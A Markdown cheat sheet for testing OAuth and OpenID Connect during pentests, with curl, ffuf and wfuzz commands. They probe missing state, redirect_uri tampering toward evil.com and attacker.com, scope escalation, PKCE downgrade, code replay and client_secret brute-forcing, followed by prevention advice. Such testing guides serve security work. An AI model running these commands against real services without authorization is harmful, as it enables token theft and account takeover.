# OAuth Authentication

> Practical, up‑to‑date guide for hunting **OAuth vulnerabilities** (OAuth 2.0 / 2.1 / OpenID Connect) during web pentests, bug bounty programs, and security assessments.  
> Draws from OWASP OAuth Cheat Sheet (latest), PortSwigger Web Security Academy (OAuth labs), Auth0/Okta Security Best Practices, RFC 6749/6750/6819/7636/8252/9068 (OAuth 2.1 draft), and 2025–2026 trends (PKCE mandatory, state/nonce enforcement, redirect_uri strict matching, scope over‑privileging, referrer token exfil, code injection downgrade attacks, third‑party app abuse).

OAuth allows third‑party apps to access user resources without sharing credentials, but misconfigurations lead to account takeover, token theft, CSRF, and privilege escalation.

## Methodology (Based on OWASP & PortSwigger)

**1. Discover OAuth endpoints & flows**  
- **Flows:** Authorization Code (with PKCE), Implicit (deprecated), Client Credentials, Hybrid, Device Code, Refresh Token  
- **Endpoints:** `/authorize`, `/token`, `/oauth2/authorize`, `/login/oauth/authorize`, callback/redirect_uris  
- **Where to look:** Login pages with social SSO, mobile/desktop apps (deep links), API docs, network traffic to auth providers

**2. Basic probes**  
- Initiate flow → intercept `/authorize` request  
- Check required params: `state`, `redirect_uri`, `code_challenge` (PKCE), `nonce` (OIDC)  
- Test missing/weak validation: remove `state`, use arbitrary `redirect_uri`, send open‑redirect payloads  
- Capture code/token → try replay, swap, or leak via Referer

**3. Common vulnerabilities**  
- Missing/weak `state` parameter → CSRF  
- Weak `redirect_uri` validation → open redirect / code injection  
- Token leakage (implicit flow, Referer header)  
- Scope escalation / over‑privileging  
- Code/token replay / swapping  
- PKCE bypass / weak `code_challenge`

**4. Advanced bypasses & 2025‑2026 trends**  
- State‑less CSRF + predictable `redirect_uri` → phishing  
- Implicit → code downgrade attacks  
- `redirect_uri` wildcard abuse (`*.evil.com`)  
- `nonce` missing/replay (OIDC)  
- Refresh token abuse (long‑lived, no rotation)  
- Open redirect in consent screen, scope parameter smuggling, code injection via `redirect_uri` query params

## Tool Installation & Setup

```bash
# Burp Suite (gold standard) – OAuth‑Attack‑Suite / oauth‑inspector extensions
# Install via Burp BApp Store

# ffuf – fast web fuzzer (already installed)
ffuf -h

# wfuzz – alternative fuzzer (used in checklist examples)
sudo apt install wfuzz -y

# OAuth‑specific tools (optional)
git clone https://github.com/andresriancho/oauth-attack-suite.git
git clone https://github.com/secureworks/oauth-inspector.git
```

## Detection & Enumeration Commands

```bash
# 1. Discover OAuth endpoints (common paths)
echo -e "/oauth/authorize\n/oauth/token\n/oauth/login\n/oauth2/authorize\n/oauth2/token\n/oauth/v1/authorize\n/oauth2/v1/authorize\n/oauth/auth\n/authorize\n/login/oauth/authorize" | ffuf -u "https://target.com/FUZZ" -mc 200,302 -c -t 50

# 2. Check subdomains for OAuth endpoints
for sub in my identity api docs auth login; do
  for path in "/oauth/authorize" "/oauth/token" "/oauth2/authorize" "/oauth2/token"; do
    curl -s -o /dev/null -w "%{http_code}\n" "https://$sub.target.com$path" | grep -v "404\|403" && echo "Found: $sub.target.com$path"
  done
done

# 3. Search crawled URLs for OAuth keywords
grep -riE "oauth|authorization|authenticate|client_id|redirect_uri|response_type|scope" crawledurls.txt 2>/dev/null | head -20

# 4. Identify OAuth flows in browser dev tools (manual)
# Look for network requests to auth.provider.com, parameters: client_id, redirect_uri, response_type, scope, state, nonce, code_challenge
```

## Exploitation Commands by Vulnerability

### Missing / Weak State Parameter (CSRF)
```bash
# Test without state parameter
curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com/callback&response_type=code&scope=openid"
# If successful → CSRF vulnerable (attacker can craft phishing link)

# Test predictable state
for state in "1" "test" "state123" "abc" "0" "123456"; do
  curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=code&state=$state" | grep -i "error\|invalid" || echo "Possible success with state=$state"
done
```

### Weak redirect_uri Validation (Open Redirect / Code Injection)
```bash
# Test arbitrary redirect_uri
curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=code"

# Test open‑redirect patterns
for uri in "https://target.com.evil.com" "https://evil.com/?target.com" "//evil.com" "https://legit.com%2F%2F.evil.com" "https://legit.com%252F.evil.com" "https://legit.com\\.evil.com"; do
  echo "Testing: $uri"
  curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=$uri&response_type=code" | head -1
done

# Fuzz redirect_uri with wfuzz (using local wordlist)
wfuzz -c -z file,/home/pwn/wordlists/common.txt \
  -d "client_id=CLIENT&redirect_uri=https://FUZZ&response_type=code&state=abc123" \
  --hc 400,404 "https://target.com/oauth/authorize"
```

### Scope Escalation / Over‑Privileging
```bash
# Add extra scopes
for scope in "admin" "write" "read:all" "user:email" "profile" "openid" "admin:user" "write:users" "all" "full_access"; do
  curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=code&scope=$scope" | grep -i "error\|consent" || echo "Scope possibly accepted: $scope"
done

# Fuzz scope values
wfuzz -c -z file,/home/pwn/wordlists/commonwords.txt \
  --hc 400,404 "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=code&scope=FUZZ"
```

### PKCE Bypass / Weak Code Challenge
```bash
# Test without PKCE (remove code_challenge)
curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=code"
# If works → PKCE not enforced

# Downgrade to plain (S256 → plain)
curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=code&code_challenge=test&code_challenge_method=plain"
```

### Token Leakage (Implicit Flow, Referer)
```bash
# Request implicit flow (token in URL fragment)
curl -s "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://legit.com&response_type=token"
# Check if access_token appears in response location header / fragment

# Test Referer header leakage
curl -s -L -H "Referer: https://attacker.com" \
  "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://attacker.com&response_type=code"
```

### Code / Token Replay / Swapping
```bash
# Replay same authorization code (obtain a valid code first)
CODE="VALID_AUTHORIZATION_CODE"
curl -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code&code=$CODE&client_id=CLIENT&client_secret=SECRET&redirect_uri=https://legit.com"
# Repeat same request; if second succeeds → replay vulnerable

# Swap victim's code with attacker's (ATO)
# Need two accounts; capture codes and attempt exchange with swapped client_id/secret
```

### Client Credentials Flow Enumeration
```bash
# Enumerate valid client_ids
wfuzz -c -z file,/home/pwn/wordlists/common.txt \
  -X POST -d "grant_type=client_credentials&client_id=FUZZ&client_secret=test" \
  --hc 401,404 "https://target.com/oauth/token"

# Fuzz client_secret for a known client_id
wfuzz -c -z file,/home/pwn/wordlists/common.txt \
  -X POST -d "grant_type=client_credentials&client_id=VALID_CLIENT&client_secret=FUZZ" \
  --hc 401,404 "https://target.com/oauth/token"
```

## Advanced Techniques & Bypasses (2025‑2026 Trends)

**1. State‑less CSRF + predictable redirect_uri** – Craft phishing link that redirects to attacker‑controlled callback after victim authorizes.

**2. Implicit → code downgrade** – Force implicit flow on a client that expects authorization code flow (by manipulating `response_type`).

**3. redirect_uri wildcard abuse** – If `*.evil.com` allowed, register `app.evil.com` and capture tokens.

**4. nonce missing / replay (OIDC)** – Replay ID token when `nonce` not validated.

**5. Refresh token abuse** – Long‑lived refresh tokens without rotation → eternal access.

**6. Open redirect in consent screen** – Some providers allow HTML in app name/logo → XSS/open redirect.

**7. Scope parameter smuggling** – Inject extra scopes via parameter pollution (`scope=read&scope=admin`).

**8. Code injection via redirect_uri query params** – `redirect_uri=https://legit.com/callback?code=ATTACKER_CODE`.

**9. Mobile deep‑link hijacking** – Custom URI schemes (`myapp://callback`) intercepted by malicious app.

**10. Third‑party app scope abuse** – GitHub/GitLab apps with excessive permissions → token theft.

## Prevention Guidance (Developer‑Focused)

1. **Mandatory PKCE (S256)** for public clients (OAuth 2.1 requirement).
2. **State parameter** – unique, unpredictable, validated on callback.
3. **Strict redirect_uri matching** – exact match, no wildcards, reject open redirects.
4. **One‑time codes** + short expiration (e.g., 5 minutes).
5. **Scope minimization** – request only needed scopes, obtain user consent per scope.
6. **Nonce (OIDC)** – required for replay protection.
7. **Avoid implicit flow** – use authorization code + PKCE.
8. **Token binding** / sender‑constrained tokens (RFC 8705).
9. **Referer‑Policy: strict‑origin‑when‑cross‑origin** to prevent Referer leakage.
10. **Regular rotation of client secrets** and use of asymmetric credentials (private_key_jwt).

## References

- [PortSwigger OAuth Authentication](https://portswigger.net/web-security/oauth)
- [PortSwigger Exploiting OAuth vulnerabilities](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-unprotected-redirect-uri)
- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html)
- [OAuth 2.1 Draft](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1)
- [PayloadsAllTheThings – OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
- **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/OAuth‑Authentication.md](../Web‑Vulnerability‑Testing‑Checklist/OAuth‑Authentication.md)
